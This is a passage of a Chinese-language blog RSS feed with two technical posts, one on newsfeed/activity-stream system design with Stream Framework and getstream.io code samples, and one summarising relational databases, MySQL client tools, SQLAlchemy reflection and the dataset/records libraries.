&lt;li&gt;&lt;a href="http://nodex.me/t/29"&gt;newsfeed架构设计和实现&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.csdn.net/article/2013-11-07/2817430-design-decisions-for-scaling-your-high-traffic-feeds"&gt;百万用户时尚分享网站feed系统扩展实践&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_6"&gt;概念篇&lt;/h1&gt;
&lt;p&gt;对Pinterest、Instagram和Fashiolista来说，feed是一个核心组件。
这些系统的共同点在于向用户展示其关注的人的动态，Fashiolista是基于&lt;a href="http://activitystrea.ms/specs/atom/1.0/"&gt;Atom Activity Streams 1.0&lt;/a&gt;（还有个使用json格式的版本)来构建动态数据流的（ps：Atom Activity Streams今年出了&lt;a href="https://www.w3.org/TR/activitystreams-core/"&gt;2.0版本&lt;/a&gt;）&lt;/p&gt;
&lt;h3 id="feed"&gt;feed&lt;/h3&gt;
&lt;p&gt;那么我们首先要搞清楚feed是什么。&lt;/p&gt;
&lt;p&gt;可以参考&lt;a href="https://en.wikipedia.org/wiki/Web_feed"&gt;Web_feed&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;On the World Wide Web, a web feed (or news feed) is a data format used for providing users with frequently updated content.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我把它理解为最新讯息，提要）&lt;/p&gt;
&lt;h3 id="activities"&gt;Activities&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://getstream.io/docs/?language=python"&gt;stream&lt;/a&gt;的文档，对我们理解消息系统很有帮助，&lt;a href="http://activitystrea.ms/specs/json/1.0/"&gt;
JSON Activity Streams 1.0&lt;/a&gt;有些抽象，而&lt;a href="https://github.com/tschellenbach/Stream-Framework"&gt;Stream-Framework&lt;/a&gt;名词太多&lt;/p&gt;
&lt;p&gt;而&lt;a href="https://getstream.io/docs/?language=python"&gt;stream&lt;/a&gt;的文档让我们在使用过程中理解消息系统&lt;/p&gt;
&lt;p&gt;一则Activities有以下属性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Actor&lt;/li&gt;
&lt;li&gt;Verb&lt;/li&gt;
&lt;li&gt;Object&lt;/li&gt;
&lt;li&gt;Target &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;举例而言&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Erik is pinning Hawaii to his Places to Visit board.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们来拆解这句话，用以上属性积木来构建它&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Actor: "Eric" (User:2)&lt;/li&gt;
&lt;li&gt;Verb: "pin"&lt;/li&gt;
&lt;li&gt;Object: "Hawaii" (Place:42)&lt;/li&gt;
&lt;li&gt;Target: "Places to Visit" (Board:1)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们来看下这个动作用代码来描述&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Instantiate a feed object&lt;/span&gt;
&lt;span class="n"&gt;user_feed_1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;feed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# Add an activity to the feed, where actor, object and target are references to objects (`Eric`, `Hawaii`, `Places to Visit`)&lt;/span&gt;
&lt;span class="n"&gt;activity_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;actor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;User:2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;verb&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;pin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;object&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Place:42&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;target&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Board:1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="n"&gt;activity_response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;user_feed_1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_activity&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;activity_data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Using the above fields, you can express any activity!&lt;/p&gt;
&lt;p&gt;意识到这点，我们就理解消息系统啦&lt;/p&gt;
&lt;p&gt;ps：用程序表达现实关系（动作），业务相关的代码通常是模拟现实（关系或者事务），所以表达现实是一种常见的模式&lt;/p&gt;
&lt;h3 id="_7"&gt;其他概念&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;fanout：将动态推送给你的粉丝的过程被称为消息分发&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="_8"&gt;参考&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.csdn.net/article/2013-11-07/2817430-design-decisions-for-scaling-your-high-traffic-feeds"&gt;百万用户时尚分享网站feed系统扩展实践&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_9"&gt;实现篇&lt;/h1&gt;
&lt;h3 id="stream-framework"&gt;stream framework&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Stream Framework is a Python library, which allows you to build newsfeed and notification systems using Cassandra and/or Redis.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Examples of what you can build are&lt;ul&gt;
&lt;li&gt;Activity streams such as seen on Github&lt;/li&gt;
&lt;li&gt;A notification system&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;之前的Feedly&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.mellowmorning.com/"&gt;作者博客&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最近我在看stream framework的实现，重点关注redis部分，之后有时间再做分析&lt;/p&gt;
&lt;p&gt;我们先来看下数据在redis里的结构&lt;/p&gt;
&lt;!--wwj-test2-image-tmp.just4fun.site -&gt; 7xrc4h.com1.z0.glb.clouddn.com --&gt;

&lt;p&gt;&lt;img alt="pin-redis" src="http://wwj-test2-image-tmp.just4fun.site/pin-redis.png" /&gt;&lt;/p&gt;
&lt;h3 id="demo"&gt;demo&lt;/h3&gt;
&lt;p&gt;这是基于stream_framework的一个demo，模仿Pinterest，用户可以发布自己的pin（类似post），其他用户可以follow该用户，并且对喜欢的物品进行点赞&lt;/p&gt;
&lt;p&gt;由于时间久远，该项目无法直接运行，我做了些调整，使其跑在osx下，测试正常&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/stream_framework_example"&gt;stream_framework_example&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;首页
&lt;img alt="pin1.png" src="http://wwj-test2-image-tmp.just4fun.site/pin1.png" /&gt;&lt;/p&gt;
&lt;p&gt;信息流&lt;/p&gt;
&lt;p&gt;&lt;img alt="pin2.png" src="http://wwj-test2-image-tmp.just4fun.site/pin2.png" /&gt;&lt;/p&gt;
&lt;p&gt;关注者
&lt;img alt="pin3.png" src="http://wwj-test2-image-tmp.just4fun.site/pin3.png" /&gt;&lt;/p&gt;
&lt;h3 id="stream"&gt;stream&lt;/h3&gt;
&lt;p&gt;当然我们也可以使用stream的服务来构建我们的消息系统,我们跑一个简单的demo&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;stream&lt;/span&gt;
&lt;span class="n"&gt;client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;stream&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;client id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;client secret&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;location&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;us-east&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;chris&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;feed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;chris&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# add an activity, message is a custom field. add as many custom fields as you&amp;#39;d like&lt;/span&gt;
&lt;span class="n"&gt;chris&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_activity&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;actor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;chris&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;verb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;add&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;object&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;picture:10&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;foreign_id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;picture:10&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;message&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;This bird is absolutely beautiful. Glad it&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt;&lt;span class="s1"&gt;s recovering from a damaged wing.&amp;#39;&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="c1"&gt;# jack&amp;#39;s timeline feed follows chris&amp;#39; user feed.&lt;/span&gt;
&lt;span class="n"&gt;jack&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;feed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;timeline&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;jack&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;jack&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;follow&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;chris&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# read the timeline for jack, chris post will show up here&lt;/span&gt;
&lt;span class="n"&gt;activities&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jack&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;results&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="c1"&gt;# read the next page, use id filtering for optimal performance&lt;/span&gt;
&lt;span class="n"&gt;next_activities&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jack&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;id_lte&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;activities&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;results&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="c1"&gt;# remove the activity by referencing the foreign_id you provided&lt;/span&gt;
&lt;span class="n"&gt;chris&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove_activity&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;foreign_id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;picture:10&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3 id="django-demo"&gt;django demo&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://exampledjango.getstream.io/"&gt;exampledjango&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 08 Jun 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-06-08:notification-system-thinking-concept-and-Implementation.html</guid><category>code</category></item><item><title>关系型数据库小结</title><link>/relational-database-summary.html</link><description>&lt;p&gt;平时用ORM偏多，生疏了SQL，周末翻了一遍《SQL必知必会》，也整理了一下相关工具，做个记录&lt;/p&gt;
&lt;h1 id="relational-database"&gt;关系数据库（Relational database）&lt;/h1&gt;
&lt;p&gt;按照维基百科说法&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;表(关系Relation)是以行(属性Attribate)和列(值组Tuble)的形式组织起来的数据的集合。一个数据库包括一个或多个表 (关系Relation)。例如，可能有一个有关作者信息的名为authors的表(关系Relation)。每列(值组Tuble)都包含特定类型的信息，如作者的姓氏。每行(属性Attribate)都包含有关特定作者的所有信息：姓、名、住址等等。在关系型数据库当中一个表 (关系Relation)就是一个关系，一个关系数据库可以包含多个表(关系Relation)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id="_1"&gt;安装&lt;/h1&gt;
&lt;p&gt;开源的关系数据库中，PostgreSQL 与MySQL 最为流行。一般使用linux发行版的包管理器就能方便地安装，更多的安装方式可以参考官网&lt;/p&gt;
&lt;h1 id="_2"&gt;客户端&lt;/h1&gt;
&lt;p&gt;关系数据库中，我用MySQL和SQLite偏多，所以列出这两个数据库相关的工具&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.mysql.com/products/workbench/"&gt;MySQL Workbench&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/dbcli/mycli"&gt;mycli&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mesasqlite.en.softonic.com/mac"&gt;MesaSQLite&lt;/a&gt;，本地应用首选是sqlite&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当然更经常地，我偏好在jupyter里使用sqlalchemy来连接数据库&lt;/p&gt;
&lt;h1 id="sql"&gt;SQL&lt;/h1&gt;
&lt;p&gt;《SQL必知必会》（第三版）里的代码:&lt;a href="https://github.com/wwj718/teach-yourself-sql.git"&gt;teach-yourself-sql&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用mycli连接数据库&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;CREATE&lt;/span&gt; &lt;span class="k"&gt;DATABASE&lt;/span&gt; &lt;span class="n"&gt;mytest&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;--创建数据库&lt;/span&gt;
&lt;span class="n"&gt;USE&lt;/span&gt; &lt;span class="n"&gt;mytest&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;--进入数据库&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mysql -u root -D mytest   &amp;lt; /tmp/teach-yourself-sql/create.txt  &lt;span class="c1"&gt;#创建新表&lt;/span&gt;
mysql -u root -D mytest   &amp;lt; /tmp/teach-yourself-sql/populate.txt  &lt;span class="c1"&gt;# 插入数据&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SHOW&lt;/span&gt; &lt;span class="n"&gt;TABLES&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="c1"&gt;--查看表&lt;/span&gt;
&lt;span class="k"&gt;DESCRIBE&lt;/span&gt; &lt;span class="n"&gt;Customers&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="c1"&gt;--显示表结构&lt;/span&gt;
&lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="n"&gt;Customers&lt;/span&gt; &lt;span class="k"&gt;limit&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;--查看数据 &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3 id="_3"&gt;查询&lt;/h3&gt;
&lt;p&gt;使用pandas做实验，存为ipynb&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/wwj718/teach-yourself-sql/blob/master/SQL.ipynb"&gt;SQL.ipynb&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;todo：用SQLAlchemy实现&lt;/p&gt;
&lt;h1 id="sqlalchemy"&gt;SQLAlchemy&lt;/h1&gt;
&lt;p&gt;SQLAlchemy是Python社区中最广泛使用的ORM工具，底层而强大&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SQLAlchemy的理念是，SQL数据库的量级和性能重要于对象集合；而对象集合的抽象又重要于表和行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id="_4"&gt;连接已有数据库&lt;/h3&gt;
&lt;p&gt;一般情况下我们已经有数据库了，那么如何将既有数据库和SQLAlchemy对接呢&lt;/p&gt;
&lt;p&gt;可以利用表的反射（Table Reflection）。把它们”导入”进来即可，这时得使用&lt;code&gt;autoload&lt;/code&gt;参数。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;create_engine&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MetaData&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Table&lt;/span&gt;
&lt;span class="c1"&gt;#使用mysql，需要安装mysql驱动&lt;/span&gt;
&lt;span class="c1"&gt;#brew install mysql-connector-c（mac）&lt;/span&gt;
&lt;span class="c1"&gt;#sudo apt-get install libmysqlclient-dev （ubuntu）&lt;/span&gt;
&lt;span class="c1"&gt;#pip install MySQL-python&lt;/span&gt;
&lt;span class="n"&gt;engine&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;create_engine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mysql+mysqldb://root@edx_host/edxapp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;echo&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;metadata&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MetaData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;engine&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;engine&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#连接成功&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;auth_user&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;metadata&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tables&lt;/span&gt; &lt;span class="c1"&gt;#true&lt;/span&gt;
&lt;span class="n"&gt;user_table&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Table&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;auth_user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;metadata&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;autoload&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#metadata携带连接信息&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;user_table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;columns&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;#打印出字段名&lt;/span&gt;
&lt;span class="n"&gt;ins&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;user_table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;ins&lt;/span&gt; &lt;span class="c1"&gt;#查看编译的sql&lt;/span&gt;
&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SELECT * FROM auth_user limit 5&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#直接执行sql&lt;/span&gt;

&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqlalchemy&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;select&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;user_table&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;参考：&lt;a href="https://segmentfault.com/a/1190000004288061"&gt;SQLAlchemy入门（一）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="sqlalchemy_1"&gt;基于SQLAlchemy的便利工具&lt;/h2&gt;
&lt;h4 id="dataset"&gt;&lt;a href="https://github.com/pudo/dataset"&gt;dataset&lt;/a&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;In short, dataset makes reading and writing data in databases as simple as reading and writing JSON files.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dataset&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mysql+mysqldb://root@edx_host/edxapp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#print(db.tables)&lt;/span&gt;
&lt;span class="n"&gt;table&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;auth_user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;columns&lt;/span&gt;
&lt;span class="c1"&gt;#result = db.query&lt;/span&gt;
&lt;span class="c1"&gt;# 导出数据 dataset.freeze(result, format=&amp;#39;json&amp;#39;, filename=&amp;#39;users.json&amp;#39;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4 id="records"&gt;&lt;a href="https://github.com/kennethreitz/records"&gt;records&lt;/a&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;SQL for Humans&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;易于导出到xls或是json。records 使用了 tablib 可以导出为任何格式&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;records&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Database&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mysql+mysqldb://root@edx_host/edxapp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;rows&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;select * from auth_user limit 5&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;rows&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dataset&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


